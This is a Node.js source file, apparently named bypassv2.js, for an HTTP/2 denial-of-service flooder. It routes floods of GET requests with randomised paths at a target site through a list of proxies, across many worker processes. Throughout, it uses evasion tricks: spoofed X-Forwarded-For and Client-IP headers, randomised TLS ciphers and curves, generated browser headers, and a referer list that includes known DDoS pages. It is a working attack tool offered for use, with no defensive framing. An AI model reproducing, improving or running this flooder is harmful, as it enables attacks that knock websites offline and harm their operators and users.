const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
const fs = require("fs");
const { HeaderGenerator } = require('header-generator');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });

 if (process.argv.length < 7){console.log(`Usage: node bypassv2.js target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(_0xcdc8x17) {
   var _0xcdc8x18 = "";
   var _0xcdc8x19 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var _0xcdc8x1a = _0xcdc8x19.length;
   for (var _0xcdc8x1b = 0; _0xcdc8x1b < _0xcdc8x17; _0xcdc8x1b++) {
     _0xcdc8x18 += _0xcdc8x19.charAt(Math.floor(Math.random() * _0xcdc8x1a));
   }
   ;
   return _0xcdc8x18;
 }
 
 const ip_spoof = () => {
   const _0xcdc8x15 = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${""}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${""}`;
 };
 const spoofed = ip_spoof();
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
}

let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "firefox", minVersion: 80, maxVersion: 114, httpVersion: "2" },
        { name: "opera", minVersion: 57, maxVersion: 95, httpVersion: "2" },
        { name: "edge", minVersion: 79, maxVersion: 112, httpVersion: "2" },
        { name: "chrome", minVersion: 80, maxVersion: 115, httpVersion: "2" },
        { name: "safari", minVersion: 14, maxVersion: 16, httpVersion: "2" },
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "windows",
    ],
    locales: ["en-US", "en"]
});
let randomHeaders = headerGenerator.getHeaders()

 const cplist = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES128-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES128-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'RC4:ECDHE-RSA-AES128-GCM-SHA256:ECDHE+3DES:RSA+3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE+AES128:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-GCM-SHA384:RSA+AES128:RC4+MD5:NULL+SHA:MEDIUM:HIGH:!NULL:RSA+3DES',
    'AEAD-CHACHA20-POLY1305-SHA256:AES-GCM:!MD5:3DES:HIGH:MEDIUM:3DES',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:HIGH:MEDIUM:3DES',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
];
const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'RSA_PSS_PSS_SHA256',
    'RSA_PSS_PSS_SHA384',
    'RSA_PSS_PSS_SHA512',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];

 const pathts = [
     "?s=", 
     "/?", 
     "?q=", 
     "?true=", 
     "?"
 ];
 const querys = [
     "", 
     "&", 
     "", 
     "&&", 
     "and", 
     "=", 
     "+", 
     "?"
 ];

const refers = [
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/',
    'https://help.baidu.com/searchResult?keywords=',
    'https://play.google.com/store/search?q=',
    'https://pornhub.com/',
    'https://r.search.yahoo.com/',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://steamcommunity.com/market/search?q=',
    'https://vk.com/profile.php?redirect=',
    'https://www.bing.com/search?q=',
    'https://www.cia.gov/index.html',
    'https://www.facebook.com/',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://www.fbi.com/',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
    'https://www.npmjs.com/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.pinterest.com/search/?q=',
    'https://www.qwant.com/search?q=',
    'https://www.ted.com/search?q=',
    'https://www.usatoday.com/search/results?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://www.youtube.com/',
    'https://yandex.ru/',
  ];
const uap = [
    'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16.2',
    'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
    'Opera/9.80 (Macintosh; Intel Mac OS X 10.14.1) Presto/2.12.388 Version/12.16',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
    'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
    'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
    'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
    'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
    'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
    "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
    "BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100 [ip:167.172.45.140]",
    "BlackBerry9700/5.0.0.351Profile/MIDP-2.1Configuration/CLDC-1.1VendorID/123",
    "BlackBerry7979/2.1.0.103 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/485",
    "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
    "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
"BlackBerry9700/5.0.0.351Profile/MIDP-2.1Configuration/CLDC-1.1VendorID/123",
"BlackBerry9700/5.0.0.423 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/174",
"BlackBerry9550/5.0.0.334 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/-1",
"BlackBerry8520/5.0.0.1075 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/168",
"BlackBerry9300/5.0.0.912 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/378",
"BlackBerry9700/5.0.0.423 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/10",
"BlackBerry8520/5.0.0.681 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/217",
"BlackBerry9520/5.0.0.306 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/120",
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
"BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/167",
"BlackBerry9300/5.0.0.888 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331",
"BlackBerry 9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
"BlackBerry9300/5.0.0.955 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/102",
"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/131",
"BlackBerry8900/5.0.0.681 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/302",
"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/603",
"BlackBerry8900/5.0.0.681 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/179",
"BlackBerry9700/5.0.0.344 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/229",
"BlackBerry9330/5.0.0.857 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/105",
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/107",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.14.1) Presto/2.12.388 Version/12.16",
"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
"Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
"Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
"Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
"Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
"Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
"Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
"Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
"Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
"Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
"Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
"Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
"Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
];
const curveconcu = [ 
"X25519",
"prime256v1",
"x25519",
"P-256",
"P-384",
"P-521",
"M-511",
"X448",
"SECP256K1",
"SECP521R1",
"SECP384R1",
"SECP256R1",
"SECP512R1",
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var curvehihi = curveconcu[Math.floor(Math.floor(Math.random() * curveconcu.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var pathts1 = pathts[Math.floor(Math.random() * pathts.length)];
var queryz = querys[Math.floor(Math.random() * querys.length)];
var Ref = refers[Math.floor(Math.random() * refers.length)];
 var proxies = readLines(args.proxyFile);
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
}

 const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path + pathts1 + randstr(25) + queryz + randstr(25);
 headers["origin"] = parsedTarget.host;
headers["Content-Type"] = randomHeaders['Content-Type'];
 headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
 headers["accept"] = randomHeaders['accept'];
 headers["accept-language"] = randomHeaders['accept-language'];
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
 headers["accept-encoding"] = randomHeaders['accept-encoding'];
 headers["cache-control"] = randomHeaders['cache-control'];
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["x-content-type-options"] = "nosniff";
headers["pragma"] = randomHeaders['pragma'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
headers["X-Forwarded-Proto"] = HTTPS;
headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["vary"] = randomHeaders['vary'];
headers["x-requested-with"] = "XMLHttpRequest";
headers["TE"] = randomHeaders['TE'];
headers["set-cookie"] = randomHeaders['set-cookie'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
headers["X-Dns-Prefetch-Control"] = randomHeaders['X-Dns-Prefetch-Control'];
headers["alt-svc"] = randomHeaders['alt-svc'];
headers["Via"] = spoofed;
headers["X-Forwarded-For"] = spoofed;
 headers["X-Forwarded-Host"] = spoofed;
 headers["Client-IP"] = spoofed;
headers["Real-IP"] = spoofed;
headers["Referer"] = randomHeaders['Referer'];

 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var useragent = userAgentv2.toString();
     headers[":authority"] = parsedTarget.host
     headers["Referer"] = Ref;
     headers["user-agent"] = uap1;
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 10,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
             ALPNProtocols: ['h2', 'http/1.1'],
             cilentTimeout: 5000,
             cilentMaxTimeout: 10000,
             challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 5,
             ciphers: tls.getCiphers().join(":") + cipper,
             secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            servername: url.hostname,
            socket: connection,
             honorCipherOrder: true,
             secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: siga,
            echdCurve: 'GREASE:X25519:prime256v1:secp384r1:secp521r1',
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
             port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 100000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 25000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             protocol: 'https:',
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 25000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);